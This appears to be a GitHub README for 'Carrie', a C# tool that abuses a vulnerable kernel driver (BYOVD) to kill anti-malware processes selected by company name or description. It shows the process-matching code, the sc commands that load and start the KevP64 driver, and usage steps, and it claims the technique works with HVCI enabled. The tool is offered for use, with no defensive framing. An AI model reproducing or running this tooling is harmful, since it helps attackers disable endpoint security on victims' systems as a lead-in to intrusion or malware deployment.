# Carrie
C# Anti-Malware Multi-Process Killer (BYOVD)

![image](https://github.com/ph4nt0mbyt3/Carrie/assets/137841478/254bba01-6cc3-4981-af94-d2cd3c336af8)





This code is designed to kill multiple process based on Company Name of the processes, and can be changed to use Description instead.

```
 static List<uint> GetProcessIdsByCompanyName(string companyName)
    {
        var processIds = new List<uint>();
        var processes = Process.GetProcesses();
        foreach (var process in processes)
        {
            try
            {
                var processModule = process.MainModule;                   
                if (processModule != null && processModule.FileVersionInfo.CompanyName == companyName)   #You can easy adapt this.
                {
                    processIds.Add((uint)process.Id);
                }
            }
            catch (Exception)
            {

            }
        }
        return processIds;
    }
```

Sample of vulnerable driver: https://www.loldrivers.io/drivers/73196456-40ae-4b6d-8562-07cf99458a7d

Works with HVCI enabled: HVCI is designed to ensure the integrity of code executed in the kernel, but it cannot protect against all possible vulnerabilities or actions that can be performed through drivers or system interfaces.

# Steps

1) Load and start the KevP64 Driver
```
sc create KevP64 binPath="c:\path\to\driver.sys" type= kernel start= demand
sc start KevP64
```

2) Start Carrie
```
Carrie.exe
```

3) Type the CompanyName propertie of the process owner or description until you receive the message "Can't find any process related, try again". This means that all processes belonging to the provided CompanyName/Description are no longer running. 
